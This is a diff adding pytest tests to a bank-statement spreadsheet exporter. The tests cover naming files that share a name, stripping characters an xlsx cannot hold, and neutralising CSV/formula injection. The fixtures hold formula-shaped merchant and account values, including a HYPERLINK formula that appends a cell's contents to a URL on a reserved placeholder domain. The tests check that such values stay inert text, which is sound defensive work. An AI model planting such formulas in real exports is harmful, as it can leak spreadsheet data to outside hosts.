@@ -5,6 +5,7 @@ balance column with debit and credit columns, a signed-amount card
 statement with its summary printed up front, and a two-account statement
 with a balance pair per account."""
 import csv
+import json
 import importlib.util
 from pathlib import Path
 
@@ -208,6 +209,56 @@ def test_the_export_caches_each_reading_and_writes_the_sheets(tmp_path, monkeypa
     r2 = xt.export(tmp_path, as_csv=True, log=lambda *_: None)
     assert r2["read"] == 0 and r2["cached"] == 1 and len(calls) == 1     # second build reads nothing
     assert (tmp_path / xt.CACHE_NAME).is_file()
+
+
+def test_two_statements_of_one_name_in_a_patterns_folders_are_told_apart(tmp_path, monkeypatch):
+    """A naming pattern's folders can hold two files of one name, one for
+    each account (#101). Each is read by the full path its index row gives,
+    and the sheet names each with the folders it is in inside the folder of
+    its kind, so the two are told apart. A file in the folder of its kind is
+    named by its name alone, as it always was."""
+    pytest.importorskip("pdfplumber")
+    bank = tmp_path / "A Bank"
+    name = "2026-07-15 A Bank Statement.pdf"
+    files = [bank / "Statements" / "Checking 1111" / name,
+             bank / "Statements" / "Savings 2222" / name,
+             bank / "Statements" / "2026-06-15 A Bank Statement.pdf"]
+    for p in files:
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(b"%PDF " + str(p).encode())
+    with open(bank / "A Bank Document Index.csv", "w", newline="", encoding="utf-8-sig") as fh:
+        w = csv.DictWriter(fh, fieldnames=["Document Date", "Document Title", "PDF Full Path"])
+        w.writeheader()
+        for p in files:
+            w.writerow({"Document Date": "2026-07-15", "Document Title": "Statement",
+                        "PDF Full Path": str(p)})
+    read = []
+    monkeypatch.setattr(xt, "pdf_lines", lambda p: (read.append(p), list(BANK))[1])
+    r = xt.export(tmp_path, as_csv=True, log=lambda *_: None)
+    assert r["statements"] == 3 and sorted(read) == sorted(files)
+    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
+        named = {row["Statement"] for row in csv.DictReader(fh)}
+    assert named == {"Checking 1111/" + name, "Savings 2222/" + name,
+                     "2026-06-15 A Bank Statement.pdf"}
+    index = bank / "A Bank Document Index.csv"
+    assert xt.statement_name(index, tmp_path / "elsewhere" / "x.pdf") == "x.pdf"
+
+
+def test_a_statement_in_the_documents_folder_is_named_with_its_folders(tmp_path):
+    """Moved to the account's documents folder (#102), which is written down
+    beside the index, a statement is named from inside that folder."""
+    bank, docs = tmp_path / "A Bank", tmp_path / "Watched"
+    bank.mkdir()
+    index = bank / "A Bank Document Index.csv"
+    pdf = docs / "Statements" / "Checking 1111" / "2026-07-15 Statement.pdf"
+    assert xt.statement_name(index, pdf) == "2026-07-15 Statement.pdf"
+    (bank / "documents-folders.json").write_text(json.dumps([str(docs)]), encoding="utf-8")
+    assert xt.statement_name(index, pdf) == "Checking 1111/2026-07-15 Statement.pdf"
+    assert xt.statement_name(index, docs / "Statements" / "flat.pdf") == "flat.pdf"
+    nested = bank / "Documents" / "Statements" / "Savings 2222" / "x.pdf"
+    (bank / "documents-folders.json").write_text(json.dumps([str(bank / "Documents")]),
+                                                 encoding="utf-8")
+    assert xt.statement_name(index, nested) == "Savings 2222/x.pdf"
 
 
 def test_with_no_statement_on_disk_nothing_is_written(tmp_path):
@@ -806,3 +857,298 @@ def test_a_whole_line_away_from_the_scattered_rows_is_kept_as_it_was():
 
 def test_the_cache_is_read_again_for_the_rebuilt_lines():
     assert xt.CACHE_VERSION >= 9
+
+
+# -- text that looks like a formula stays text ----------------------------------------
+
+# A merchant chooses the name a statement prints, and the archive's index
+# names the account. Each value here is shaped like a formula and is
+# harmless arithmetic or an address on a reserved domain.
+MERCHANT = '=HYPERLINK("https://example.invalid/?"&A1,"Open")'
+FORMULA_BANK = """Statement Period: 06/13/2026to 07/12/2026
+Beginning Balance $4,812.37
+Ending Balance $6,443.85
+Date Description Debits Credits Balance
+06/13 Beginning Balance 0 0 $4,812.37
+06/13 %s $58.21 0 $4,754.16
+06/15 @SUM(1,1) 0 $2,146.73 $6,900.89
+06/19 +1+1 GROCER $187.44 0 $6,713.45
+06/20 -1+1 0 $42.00 $6,755.45
+07/05 =1+1 $0.00 0 $6,755.45
+07/09 -42 $311.60 0 $6,443.85
+07/12 Ending Balance - - $6,443.85
+""" % MERCHANT
+ACCOUNT = "@SUM(2,2), =2+2"          # Account Holder, then the Document Title
+STATEMENT = "=3+3 Statement.pdf"
+FORMULAS_BY_SHEET = {
+    "Transactions": {"+Bank", ACCOUNT, MERCHANT, "@SUM(1,1)", "+1+1 GROCER", "-1+1", "=1+1",
+                     STATEMENT},
+    "Statements": {"+Bank", ACCOUNT, STATEMENT},
+}
+
+
+@pytest.fixture
+def formula_root(tmp_path, monkeypatch):
+    pytest.importorskip("pdfplumber")
+    folder = tmp_path / "Plus Bank"
+    folder.mkdir()
+    pdf = folder / STATEMENT
+    pdf.write_bytes(b"%PDF")
+    with open(folder / "+Bank Document Index.csv", "w", newline="", encoding="utf-8-sig") as fh:
+        w = csv.DictWriter(fh, fieldnames=["Account Holder", "Document Date", "Document Title", "PDF Full Path"])
+        w.writeheader()
+        w.writerow({"Account Holder": "@SUM(2,2)", "Document Date": "2026-07-15",
+                    "Document Title": "=2+2", "PDF Full Path": str(pdf)})
+    monkeypatch.setattr(xt, "pdf_lines", lambda p: FORMULA_BANK.splitlines())
+    return tmp_path
+
+
+def _cells(ws):
+    return [c for row in ws.iter_rows() for c in row]
+
+
+def _column(ws, name):
+    header = [c.value for c in ws[1]]
+    return [row[header.index(name)] for row in ws.iter_rows(min_row=2)]
+
+
+def test_every_text_cell_on_both_sheets_is_a_string_cell_never_a_formula(formula_root):
+    openpyxl = pytest.importorskip("openpyxl")
+    import zipfile
+    r = xt.export(formula_root, log=lambda *_: None)
+    assert r["reconciled"] == 1 and r["transactions"] == 6
+    wb = openpyxl.load_workbook(r["path"])
+    assert wb.sheetnames == list(FORMULAS_BY_SHEET)
+    for ws in wb:
+        cells = _cells(ws)
+        assert all(c.data_type in ("s", "n") for c in cells), \
+            [(c.coordinate, c.data_type) for c in cells if c.data_type not in ("s", "n")]
+        assert all(c.data_type == "s" for c in cells if isinstance(c.value, str))
+        assert {c.value for c in cells if c.quotePrefix} == FORMULAS_BY_SHEET[ws.title], ws.title
+    descriptions = {c.value: c for c in _column(wb["Transactions"], "Description")}
+    assert descriptions[MERCHANT].data_type == "s"
+    # A description that is a plain negative number is text, with nothing in front.
+    assert descriptions["-42"].data_type == "s" and not descriptions["-42"].quotePrefix
+    with zipfile.ZipFile(r["path"]) as z:
+        sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/")]
+        assert len(sheets) == 2
+        assert not any(b"<f>" in z.read(n) or b"<f " in z.read(n) for n in sheets)
+
+
+def test_amounts_balances_and_counts_stay_numbers_with_their_format(formula_root):
+    openpyxl = pytest.importorskip("openpyxl")
+    wb = openpyxl.load_workbook(xt.export(formula_root, log=lambda *_: None)["path"])
+    txns, stmts = wb["Transactions"], wb["Statements"]
+    amounts = _column(txns, "Amount")
+    assert sorted(c.value for c in amounts) == [-311.6, -187.44, -58.21, 0.0, 42.0, 2146.73]
+    for col in ("Amount", "Balance"):
+        for c in _column(txns, col):
+            assert c.data_type == "n" and c.number_format == "#,##0.00;[Red]-#,##0.00", (col, c.value)
+    (stmt,) = list(stmts.iter_rows(min_row=2))
+    stmt = dict(zip([c.value for c in stmts[1]], stmt))
+    assert (stmt["Beginning Balance"].value, stmt["Beginning Balance"].data_type) == (4812.37, "n")
+    assert (stmt["Ending Balance"].value, stmt["Ending Balance"].data_type) == (6443.85, "n")
+    assert (stmt["Transactions"].value, stmt["Transactions"].data_type) == (6, "n")
+    assert stmt["Sum of Amounts"].data_type == "n"
+    assert stmt["Status"].value == "reconciled, balance column" and stmt["Status"].data_type == "s"
+
+
+def test_the_csv_quotes_text_that_could_start_a_formula_and_no_amount(formula_root):
+    r = xt.export(formula_root, as_csv=True, log=lambda *_: None)
+    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
+        rows = list(csv.DictReader(fh))
+    by_amount = {x["Amount"]: x for x in rows}
+    assert by_amount["-58.21"]["Description"] == "'" + MERCHANT
+    assert by_amount["2146.73"]["Description"] == "'@SUM(1,1)"
+    assert by_amount["-187.44"]["Description"] == "'+1+1 GROCER"
+    assert by_amount["42.0"]["Description"] == "'-1+1"
+    assert by_amount["0.0"]["Description"] == "'=1+1"
+    assert by_amount["-311.6"]["Description"] == "-42"
+    assert by_amount["-311.6"]["Balance"] == "6443.85"
+    for x in rows:
+        assert (x["Provider"], x["Account"], x["Statement"]) == ("'+Bank", "'" + ACCOUNT, "'" + STATEMENT)
+        assert (x["Date"][:5], x["Statement Date"], x["Reconciled"]) == ("2026-", "2026-07-15", "yes")
+        assert not x["Amount"].startswith("'") and not x["Balance"].startswith("'")
+
+
+# -- an index the app wrote itself -----------------------------------------------------
+
+INDEX_COLUMNS = ["Account Holder", "Document Date", "Document Title", "PDF Filename",
+                 "PDF Full Path"]
+
+
+def _archive(root: Path, by_the_app: bool) -> Path:
+    """One statement whose file name starts like a formula, its index
+    written as an app writes it through core storage's CsvFile, or plainly
+    as an older version wrote it. The path is relative to the index's
+    folder, as every install the control panel creates records it."""
+    folder = root / "Plus Bank"
+    folder.mkdir(parents=True)
+    (folder / STATEMENT).write_bytes(b"%PDF")
+    row = {"Account Holder": "@SUM(2,2)", "Document Date": "2026-07-15", "Document Title": "=2+2",
+           "PDF Filename": STATEMENT, "PDF Full Path": STATEMENT}
+    index = folder / "+Bank Document Index.csv"
+    if by_the_app:
+        from paperpull_core.storage import CsvFile
+        CsvFile(index, INDEX_COLUMNS).append_rows([row])
+    else:
+        with open(index, "w", newline="", encoding="utf-8-sig") as fh:
+            w = csv.DictWriter(fh, fieldnames=INDEX_COLUMNS)
+            w.writeheader()
+            w.writerow(row)
+    return index
+
+
+def test_an_index_the_app_wrote_finds_its_statement_and_gives_the_words_it_was_given(
+        tmp_path, monkeypatch):
+    """The app's index holds a file name like =3+3 Statement.pdf with a
+    quote in front, so read as it is, the statement would be looked for
+    under a name it does not have and left out of the spreadsheet without
+    a word. It is found, and both spreadsheets are the ones the same words
+    written plainly give."""
+    pytest.importorskip("pdfplumber")
+    openpyxl = pytest.importorskip("openpyxl")
+    monkeypatch.setattr(xt, "pdf_lines", lambda p: FORMULA_BANK.splitlines())
+    old, new = tmp_path / "old", tmp_path / "new"
+    _archive(old, by_the_app=False)
+    index = _archive(new, by_the_app=True)
+    assert ",'=3+3 Statement.pdf,'=3+3 Statement.pdf" in index.read_text(encoding="utf-8-sig")
+    (row,) = xt._index_rows(index)
+    assert xt.pdf_path(index, row).is_file()
+    assert [p["pdfs"] for p in xt.providers(new)] == [1]
+    made = {}
+    for root in (old, new):
+        r = xt.export(root, as_csv=True, log=lambda *_: None)
+        assert (r["statements"], r["transactions"]) == (1, 6), root.name
+        made[root.name] = Path(r["path"]).read_bytes()
+    assert made["old"] == made["new"]
+    sheets = {}
+    for root in (old, new):
+        wb = openpyxl.load_workbook(xt.export(root, log=lambda *_: None)["path"])
+        sheets[root.name] = {ws.title: [[(c.value, c.data_type, c.quotePrefix) for c in row]
+                                        for row in ws.iter_rows()] for ws in wb}
+    assert sheets["old"] == sheets["new"]
+
+
+# -- what an xlsx cell cannot hold ---------------------------------------------------
+
+# Every character XML 1.0 has no place for, so an xlsx cannot hold it. The
+# control characters are the 29 openpyxl refuses, and the last two and the
+# surrogates it wrote into a workbook Excel would not open.
+CONTROLS = [chr(n) for n in range(0x20) if n not in (0x9, 0xA, 0xD)]
+IN_A_FILE = CONTROLS + [chr(0xFFFE), chr(0xFFFF)]
+CANNOT_HOLD = IN_A_FILE + [chr(n) for n in range(0xD800, 0xE000)]
+_CANNOT = frozenset(CANNOT_HOLD)
+# The six Python counts as blank space, which become a space in a cell.
+BLANK = frozenset(chr(n) for n in (0x0B, 0x0C, 0x1C, 0x1D, 0x1E, 0x1F))
+
+
+def _held(text: str) -> str:
+    return "".join(" " if c in BLANK else "" if c in _CANNOT else c for c in text)
+
+
+def _excel_reads(text: str) -> str:
+    """What Excel shows for an xlsx string, _x and four hex digits and _ as
+    one character (measured 2026-10-16, see test_sheets.py)."""
+    import re
+    return re.sub(r"_x([0-9A-Fa-f]{4})_", lambda m: chr(int(m.group(1), 16)), text)
+
+
+def _no_cell_holds_what_an_xlsx_cannot(path):
+    openpyxl = pytest.importorskip("openpyxl")
+    import zipfile
+    wb = openpyxl.load_workbook(path)
+    for ws in wb:
+        for c in _cells(ws):
+            assert not (isinstance(c.value, str) and not _CANNOT.isdisjoint(c.value)), c.coordinate
+    with zipfile.ZipFile(path) as z:
+        sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/")]
+        assert not any(b"<f>" in z.read(n) or b"<f " in z.read(n) for n in sheets)
+    return wb
+
+
+def _bank_with_every_character(chars) -> tuple:
+    """A made-up statement, one $1.00 debit described SHOP, the character,
+    NAME for each character, and a last one whose description Excel would
+    read as its escape for =. Its lines, and the balance after that last."""
+    begin = 1000.0 + len(chars)
+    bal, lines = begin, []
+    for i, what in enumerate(["SHOP " + c + "NAME" for c in chars] + ["_x003D_1+1"]):
+        bal -= 1
+        lines.append("06/%02d %s $1.00 0 $%s" % (i % 28 + 1, what, format(bal, ",.2f")))
+    return (["Statement Period: 06/01/2026to 06/30/2026",
+             "Beginning Balance $%s" % format(begin, ",.2f"),
+             "Ending Balance $%s" % format(bal, ",.2f"),
+             "Date Description Debits Credits Balance",
+             "06/01 Beginning Balance 0 0 $%s" % format(begin, ",.2f")]
+            + lines + ["06/30 Ending Balance - - $%s" % format(bal, ",.2f")]), bal
+
+
+def _bank_folder(root: Path, holder: str, title: str) -> Path:
+    """The statement's folder, its index written as the app writes it,
+    through core storage's CsvFile."""
+    from paperpull_core.storage import CsvFile
+    folder = root / "Plus Bank"
+    folder.mkdir()
+    (folder / "June Statement.pdf").write_bytes(b"%PDF")
+    index = CsvFile(folder / "Bank Document Index.csv", INDEX_COLUMNS)
+    index.append_rows([{"Account Holder": holder, "Document Date": "2026-06-30",
+                        "Document Title": title, "PDF Filename": "June Statement.pdf",
+                        "PDF Full Path": "June Statement.pdf"}])
+    return index.path
+
+
+def test_an_index_and_a_statement_holding_a_character_an_xlsx_cannot_hold_make_both_spreadsheets(
+        tmp_path, monkeypatch):
+    """A provider's JSON can carry a NUL or another control character in a
+    document title, and a statement's text in a description. openpyxl
+    refused the row holding one and the whole workbook was lost. Now the
+    character is taken out of the cell, a space standing in for one that is
+    blank space, the text around it stays, one in front of =1+1 leaves =1+1
+    with the quote prefix, and the CSV keeps every character the statement
+    gave."""
+    pytest.importorskip("pdfplumber")
+    assert len(CONTROLS) == 29
+    index = _bank_folder(tmp_path, chr(0) + "=1+1", "Checking " + "".join(IN_A_FILE))
+    assert chr(0) in index.read_text(encoding="utf-8-sig")
+    lines, last = _bank_with_every_character(IN_A_FILE)
+    monkeypatch.setattr(xt, "pdf_lines", lambda p: lines)
+    r = xt.export(tmp_path, log=lambda *_: None)
+    assert (r["statements"], r["transactions"], r["reconciled"]) == (1, len(IN_A_FILE) + 1, 1)
+    wb = _no_cell_holds_what_an_xlsx_cannot(r["path"])
+    txns, stmts = wb["Transactions"], wb["Statements"]
+    for c in _column(txns, "Account") + _column(stmts, "Account"):
+        assert (c.value, c.data_type, c.quotePrefix) == ("=1+1, Checking " + " " * 6, "s", True)
+    shown = {b.value: d for b, d in zip(_column(txns, "Balance"), _column(txns, "Description"))}
+    escaped = shown.pop(last)
+    assert _excel_reads(escaped.value) == "_x003D_1+1" and not escaped.quotePrefix
+    assert {d.value for d in shown.values()} == {"SHOP NAME"}
+    assert all(c.data_type == "n" for c in _column(txns, "Amount"))
+    with open(xt.export(tmp_path, as_csv=True, log=lambda *_: None)["path"],
+              encoding="utf-8-sig", newline="") as fh:
+        written = {float(x["Balance"]): x["Description"] for x in csv.DictReader(fh)}
+    assert {c for c in IN_A_FILE if not c.isspace()} <= set("".join(written.values()))
+    for balance, d in shown.items():
+        assert d.value == _held(written[balance]), balance
+
+
+def test_a_statement_holding_a_surrogate_makes_the_xlsx_from_the_pdf_and_from_the_cache(
+        tmp_path, monkeypatch):
+    """A statement's text reaches the export from the PDF, and on a later
+    export from the cache, which is JSON and holds half of a surrogate pair
+    as an escape. So every character an xlsx cannot hold is tried here, the
+    2,048 surrogates too, both ways."""
+    pytest.importorskip("pdfplumber")
+    _bank_folder(tmp_path, "Jane", "Checking")
+    lines, last = _bank_with_every_character(CANNOT_HOLD)
+    monkeypatch.setattr(xt, "pdf_lines", lambda p: lines)
+    for way in ("from the PDF", "from the cache"):
+        r = xt.export(tmp_path, log=lambda *_: None)
+        assert (r["transactions"], r["reconciled"]) == (len(CANNOT_HOLD) + 1, 1), way
+        txns = _no_cell_holds_what_an_xlsx_cannot(r["path"])["Transactions"]
+        shown = {b.value: d.value for b, d in zip(_column(txns, "Balance"), _column(txns, "Description"))}
+        assert _excel_reads(shown.pop(last)) == "_x003D_1+1", way
+        assert set(shown.values()) == {"SHOP NAME"} and len(shown) == len(CANNOT_HOLD), way
+        assert all(c.data_type == "n" for c in _column(txns, "Amount")), way
+        monkeypatch.setattr(xt, "pdf_lines", lambda p: pytest.fail("read the PDF again"))
+    assert chr(92) + "ud800" in (tmp_path / xt.CACHE_NAME).read_text(encoding="utf-8")
